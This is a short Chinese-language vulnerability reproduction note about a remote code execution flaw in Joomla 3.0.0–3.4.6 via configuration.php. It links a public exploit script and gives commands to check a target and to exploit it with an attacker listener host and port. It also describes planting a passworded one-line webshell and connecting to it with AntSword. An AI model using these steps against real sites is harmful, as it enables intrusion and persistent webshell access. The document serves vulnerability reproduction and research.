# Joomla 3.4.6 - 'configuration.php' Remote Code Execution

> 原文：[https://www.zhihuifly.com/t/topic/2998](https://www.zhihuifly.com/t/topic/2998)

# Joomla 3.4.6 configuration.php 远程代码执行

## 一、漏洞简介

Joomla 3.4.6 - 'configuration.php' Remote Code Execution

## 二、影响范围

Joomla 3.0.0 至 3.4.6

## 三、复现过程

https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution

### 脚本验证

验证：

```
python3 test.py -t http://127.0.0.1:8080/ 
```

![image](img/e87feef9082c4fb8ad5a0db6d3696dad.png)

显示“Vulnerable”证明存在漏洞

利用：

```
python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121 
```

![image](img/088d991b97a4e5060a5d5032ff4e2ff6.png)

执行成功

并在“configuration.php”写入**随机密码**的一句话木马

![image](img/797a820246def864e0f14cfa5113520a.png)
上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi

蚁剑链接测试

![image](img/4ffcfeb2b4e40eea33f890726faf57ad.png)